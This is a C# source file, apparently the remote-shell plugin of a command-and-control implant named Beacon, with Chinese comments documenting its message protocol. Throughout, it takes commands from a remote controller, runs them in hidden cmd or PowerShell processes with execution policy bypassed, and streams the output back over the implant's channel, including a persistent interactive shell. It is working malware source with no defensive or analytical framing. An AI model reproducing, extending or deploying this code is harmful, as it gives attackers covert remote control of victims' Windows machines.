using Beacon.MessagePackLib;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace cc
{
    public static class Packet
    {
		/*
		消息包协议（Shell 插件）
		========================================
		一、控制端 -> 插件（Beacon 侧收到后转交本插件）
		通用字段：
		- "Pac_ket": 命令类型（见下）
		- "CID": 会话唯一标识（由服务端分配，用于回传时关联）
		- 其他命令相关字段（按命令不同而不同）

		命令列表：
		1) Start / StartCmd / StartPS
		   - 作用：启动对应类型的交互式 Shell，持续回传输出
		   - 字段：
		     • Start：可选 "ShellType" 字段，取值 "cmd" 或 "powershell"（默认 "cmd"）
		     • StartCmd：固定启动 CMD
		     • StartPS：固定启动 PowerShell

		2) Input
		   - 作用：向已启动的交互式 Shell 写入一行命令
		   - 字段：
		     • "Text": 要写入的命令文本（不需要结尾换行，内部会追加）

		3) Stop
		   - 作用：停止当前交互式 Shell，并销毁实例
		   - 字段：无

		4) Run / RunCmd / RunPS
		   - 作用：一次性执行命令（非交互），返回输出后自动结束并销毁实例
		   - 字段：
		     • Run："Command"（或兼容字段 "Cmd"），可选 "ShellType"（"cmd"/"powershell"，默认 "cmd"）
		     • RunCmd："Command"（或 "Cmd"），固定 CMD
		     • RunPS："Command"（或 "Cmd"），固定 PowerShell

		二、插件 -> 控制端（回传数据）
		成功输出：
		- "Pac_ket": "Shell"
		- "Action":  "Output"
		- "CID":     会话标识（原样回传）
		- "ShellType": "cmd" 或 "powershell"（表明当前输出来自哪种 Shell）
		- "IsError": 0/1（是否为错误流）
		- "Completed": 0/1（是否结束标记；一次性执行或进程退出时会置为 1）
		- "Text": 输出内容（可能分片多次发送）

		错误回传：
		- "Pac_ket": "Error"
		- "CID":     会话标识
		- "Error":   错误信息文本
		========================================
		*/
        private static readonly object _syncRoot = new object();
        private static Process _shellProcess;
        private static Thread _stdoutReader;
        private static Thread _stderrReader;
        private static string _currentCid = string.Empty;
        private static string _currentShell = "cmd"; // cmd | powershell

        public static void Read(BeaconMsgPack unpack_msgpack)
        {
            Console.WriteLine("Plugin Information Read");
            try
            {
                string type = unpack_msgpack.ForcePathObject("Pac_ket").AsString;
                _currentCid = unpack_msgpack.ForcePathObject("CID").AsString;

				switch (type)
                {
					case "Run":
                        {
							// 一次性执行：支持可选 ShellType
							string cmd = SafeGet(unpack_msgpack, "Command");
                            if (string.IsNullOrEmpty(cmd)) cmd = SafeGet(unpack_msgpack, "Cmd");
                            if (string.IsNullOrEmpty(cmd)) throw new ArgumentException("Empty command");
                            string shell = SafeGet(unpack_msgpack, "ShellType"); // cmd | powershell
                            string output = ExecOnce(cmd, shell);
                            SendOutput(_currentCid, output, false, true);
                            Plugin.Destroy();
                            break;
                        }
                    case "RunCmd":
                        {
							// 一次性执行（强制 CMD）
							string cmd = SafeGet(unpack_msgpack, "Command");
                            if (string.IsNullOrEmpty(cmd)) cmd = SafeGet(unpack_msgpack, "Cmd");
                            if (string.IsNullOrEmpty(cmd)) throw new ArgumentException("Empty command");
                            string output = ExecOnce(cmd, "cmd");
                            SendOutput(_currentCid, output, false, true);
                            Plugin.Destroy();
                            break;
                        }
                    case "RunPS":
                        {
							// 一次性执行（强制 PowerShell）
							string cmd = SafeGet(unpack_msgpack, "Command");
                            if (string.IsNullOrEmpty(cmd)) cmd = SafeGet(unpack_msgpack, "Cmd");
                            if (string.IsNullOrEmpty(cmd)) throw new ArgumentException("Empty command");
                            string output = ExecOnce(cmd, "powershell");
                            SendOutput(_currentCid, output, false, true);
                            Plugin.Destroy();
                            break;
                        }
					case "Start":
                        {
							// 启动交互式 Shell：可选 ShellType
							string shell = SafeGet(unpack_msgpack, "ShellType"); // cmd | powershell
                            StartShell(_currentCid, shell);
                            break;
                        }
                    case "StartCmd":
                        {
							// 启动交互式 CMD
                            StartShell(_currentCid, "cmd");
                            break;
                        }
                    case "StartPS":
                        {
							// 启动交互式 PowerShell
                            StartShell(_currentCid, "powershell");
                            break;
                        }
                    case "Input":
                        {
							// 交互式输入一行文本
                            string text = SafeGet(unpack_msgpack, "Text");
                            if (text == null) text = string.Empty;
                            WriteInput(text);
                            break;
                        }
                    case "Stop":
                        {
                            // 停止交互式 Shell（不销毁插件实例，便于后续再次 Start 切换 Shell）
                            StopShell();
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message, unpack_msgpack.ForcePathObject("CID").AsString);
            }
        }
        public static void Error(string ex, string CID)
        {
            BeaconMsgPack msgpack = new BeaconMsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("CID").AsString = CID;
            msgpack.ForcePathObject("Error").AsString = ex;
            Plugin.SendFramed(msgpack.Encode2Bytes());
        }

        private static string SafeGet(BeaconMsgPack p, string key)
        {
            try { return p.ForcePathObject(key).AsString; } catch { return string.Empty; }
        }

        private static string ExecOnce(string command, string shell)
        {
            try
            {
                var mode = NormalizeShell(shell);
                ProcessStartInfo psi = BuildPsiForOnce(command, mode);
                using (Process p = Process.Start(psi))
                {
                    if (p == null) return string.Empty;
                    string stdout = p.StandardOutput.ReadToEnd();
                    string stderr = p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    return string.IsNullOrEmpty(stderr) ? stdout : stdout + "\r\n" + stderr;
                }
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        private static void StartShell(string cid, string shell)
        {
            lock (_syncRoot)
            {
                if (_shellProcess != null && !_shellProcess.HasExited) return;

                var mode = NormalizeShell(shell);
                _currentShell = mode;
                ProcessStartInfo psi = BuildPsiForInteractive(mode);

                _shellProcess = new Process { StartInfo = psi, EnableRaisingEvents = true };
                _shellProcess.Exited += (s, e) =>
                {
                    try { SendOutput(cid, "[Shell exited]", false, true); } catch { }
                };
                _shellProcess.Start();

                _stdoutReader = new Thread(() => ReadStreamLoop(cid, _shellProcess.StandardOutput, false)) { IsBackground = true };
                _stderrReader = new Thread(() => ReadStreamLoop(cid, _shellProcess.StandardError, true)) { IsBackground = true };
                _stdoutReader.Start();
                _stderrReader.Start();
                // 不再写入 prompt，避免多余的提示输出
            }
        }

        private static void WriteInput(string text)
        {
            lock (_syncRoot)
            {
                if (_shellProcess == null || _shellProcess.HasExited) return;
                try
                {
                    _shellProcess.StandardInput.WriteLine(text);
                    _shellProcess.StandardInput.Flush();
                }
                catch { }
            }
        }

        private static void ReadStreamLoop(string cid, StreamReader reader, bool isError)
        {
            try
            {
                char[] buffer = new char[4096];
                while (true)
                {
                    int read = reader.Read(buffer, 0, buffer.Length);
                    if (read <= 0) break;
                    string chunk = new string(buffer, 0, read);
                    SendOutput(cid, chunk, isError, false);
                }
            }
            catch { }
        }

        private static void StopShell()
        {
            lock (_syncRoot)
            {
                try
                {
                    if (_shellProcess != null && !_shellProcess.HasExited)
                    {
                        try { _shellProcess.Kill(); } catch { try { _shellProcess.Kill(); } catch { } }
                    }
                }
                catch { }
                finally
                {
                    _shellProcess?.Dispose();
                    _shellProcess = null;
                }
            }
        }

        private static void SendOutput(string cid, string text, bool isError, bool completed)
        {
            try
            {
                BeaconMsgPack msgpack = new BeaconMsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "Shell";
                msgpack.ForcePathObject("Action").AsString = "Output";
                msgpack.ForcePathObject("CID").AsString = cid;
                msgpack.ForcePathObject("ShellType").AsString = _currentShell;
                msgpack.ForcePathObject("IsError").AsInteger = isError ? 1 : 0;
                msgpack.ForcePathObject("Completed").AsInteger = completed ? 1 : 0;
                msgpack.ForcePathObject("Text").AsString = text ?? string.Empty;
                Plugin.SendFramed(msgpack.Encode2Bytes());
            }
            catch { }
        }

        private static string NormalizeShell(string shell)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(shell)) return "cmd";
                shell = shell.Trim().ToLowerInvariant();
                if (shell.StartsWith("ps")) return "powershell";
                if (shell.Contains("power")) return "powershell";
                return shell == "cmd" ? "cmd" : "cmd";
            }
            catch { return "cmd"; }
        }

        private static ProcessStartInfo BuildPsiForOnce(string command, string mode)
        {
            if (mode == "powershell")
            {
                return new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoLogo -NoProfile -ExecutionPolicy Bypass -Command \"" + command.Replace("\"", "\\\"") + "\"",
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = new UTF8Encoding(false),
                    StandardErrorEncoding = new UTF8Encoding(false)
                };
            }
            else
            {
                return new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.GetEncoding(936),
                    StandardErrorEncoding = Encoding.GetEncoding(936)
                };
            }
        }

        private static ProcessStartInfo BuildPsiForInteractive(string mode)
        {
            if (mode == "powershell")
            {
                return new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoLogo -NoProfile -ExecutionPolicy Bypass",
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    StandardOutputEncoding = new UTF8Encoding(false),
                    StandardErrorEncoding = new UTF8Encoding(false)
                };
            }
            else
            {
                return new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/Q", // 关闭 ECHO，减少回显杂讯
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.GetEncoding(936),
                    StandardErrorEncoding = Encoding.GetEncoding(936)
                };
            }
        }
    }
}
